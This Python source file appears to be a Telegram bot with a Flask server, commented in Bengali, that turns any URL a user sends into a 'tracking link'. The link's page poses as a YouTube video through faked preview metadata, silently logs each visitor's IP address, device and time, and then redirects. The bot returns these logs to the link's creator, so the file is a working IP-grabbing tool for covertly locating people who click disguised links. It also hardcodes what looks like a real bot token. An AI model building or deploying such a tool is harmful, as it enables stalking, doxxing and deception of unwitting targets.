import os
import logging
import threading
import uuid
import re
import urllib.request
import json
from datetime import datetime
import pytz
from flask import Flask, request
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ==================== কনফিগারেশন ====================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8839314723:AAEpkDiDk4nRvuHr6SbRqt-JPOX0LY9qaz4")
RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "")

db = {}
bd_tz = pytz.timezone('Asia/Dhaka')

# ==================== YouTube তথ্য বের করার ফাংশন ====================
def get_youtube_info(url):
    video_id = None
    patterns = [
        r'(?:youtube\.com/watch\?v=|youtu\.be/|youtube\.com/shorts/)([a-zA-Z0-9_-]{11})',
        r'youtube\.com/embed/([a-zA-Z0-9_-]{11})'
    ]
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            video_id = match.group(1)
            break

    if not video_id:
        return None

    thumbnail = f"https://i.ytimg.com/vi/{video_id}/maxresdefault.jpg"
    title = "YouTube Video"
    try:
        oembed_url = f"https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v={video_id}&format=json"
        with urllib.request.urlopen(oembed_url, timeout=5) as response:
            data = json.loads(response.read().decode())
            title = data.get('title', title)
    except Exception as e:
        print(f"YouTube info error: {e}")

    return {'video_id': video_id, 'thumbnail': thumbnail, 'title': title}

# ==================== Flask সার্ভার ====================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/Viral/<track_id>')
def track(track_id):
    if track_id in db:
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if user_ip and ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()

        user_agent = request.headers.get('User-Agent', 'Unknown Device')
        current_time = datetime.now(bd_tz).strftime('%d-%m-%Y %I:%M:%S %p')

        db[track_id]['ips'].append({
            'ip': user_ip,
            'device': user_agent,
            'time': current_time
        })

        original_url = db[track_id]['original_url']
        og_title = db[track_id].get('og_title', 'YouTube Video')
        og_description = db[track_id].get('og_description', 'Enjoy the video!')
        og_image = db[track_id].get('og_image', 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg')

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:title" content="{og_title}" />
            <meta property="og:description" content="{og_description}" />
            <meta property="og:image" content="{og_image}" />
            <meta property="og:image:width" content="1280" />
            <meta property="og:image:height" content="720" />
            <meta property="og:url" content="{request.url}" />
            <meta property="og:type" content="video.other" />
            <meta property="og:site_name" content="YouTube" />
            <meta name="twitter:card" content="player" />
            <meta name="twitter:title" content="{og_title}" />
            <meta name="twitter:image" content="{og_image}" />
            <meta http-equiv="refresh" content="0; url={original_url}" />
            <title>{og_title}</title>
        </head>
        <body>
            <p>Redirecting to <a href="{original_url}">{original_url}</a>...</p>
        </body>
        </html>
        """
        return html
    else:
        return "Link Expired or Invalid!", 404

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ==================== টেলিগ্রাম বট ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 স্বাগতম!\nআমাকে যেকোনো একটি আসল ইউআরএল পাঠান। আমি আপনাকে একটি ট্র্যাকিং লিঙ্ক বানিয়ে দেব।"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()

    if url.startswith("/check_"):
        track_id = url.replace("/check_", "").strip()
        await send_ip_report(update, track_id)
        return

    if not (url.startswith("http://") or url.startswith("https://")):
        await update.message.reply_text("❌ একটি সঠিক URL পাঠান।")
        return

    track_id = str(uuid.uuid4())[:8]

    og_title = "🔥 Viral Video"
    og_description = "আপনার পছন্দের ভিডিওটি উপভোগ করুন!"
    og_image = "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"

    yt_info = get_youtube_info(url)
    if yt_info:
        og_title = yt_info['title']
        og_image = yt_info['thumbnail']
        og_description = "YouTube ভিডিওটি দেখতে ক্লিক করুন!"

    db[track_id] = {
        'original_url': url,
        'ips': [],
        'og_title': og_title,
        'og_description': og_description,
        'og_image': og_image
    }

    if RAILWAY_DOMAIN:
        tracking_link = f"https://{RAILWAY_DOMAIN}/Viral/{track_id}"
    else:
        tracking_link = f"http://localhost:5000/Viral/{track_id}"

    msg = (
        f"✅ **আপনার ট্র্যাকিং লিঙ্ক তৈরি হয়েছে!**\n\n"
        f"🔗 **Tracking Link:**\n`{tracking_link}`\n\n"
        f"📊 সংগৃহীত আইপি দেখতে:\n`/check_{track_id}`"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def send_ip_report(update: Update, track_id: str):
    if track_id in db:
        ips_list = db[track_id]['ips']
        if not ips_list:
            await update.message.reply_text("⚠️ এখনো কেউ এই লিঙ্কে ক্লিক করেনি।")
        else:
            report = f"🎯 **মোট ক্লিক:** {len(ips_list)}\n\n"
            for idx, item in enumerate(ips_list, 1):
                report += f"{idx}. **IP:** `{item['ip']}`\n"
                report += f"🕒 **Time:** `{item['time']}`\n"
                report += f"📱 **Device:** `{item['device']}`\n\n"
            await update.message.reply_text(report, parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ তথ্য পাওয়া যায়নি বা আইডি ভুল।")

# ==================== মূল প্রসেস ====================
if __name__ == '__main__':
    # Flask সার্ভার ব্যাকগ্রাউন্ডে চালু (Railway-এর PORT-এ)
    threading.Thread(target=run_flask, daemon=True).start()

    # বট স্টার্ট
    bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.TEXT, handle_message))

    print("🚀 Server & Bot are running smoothly!")
    bot_app.run_polling()
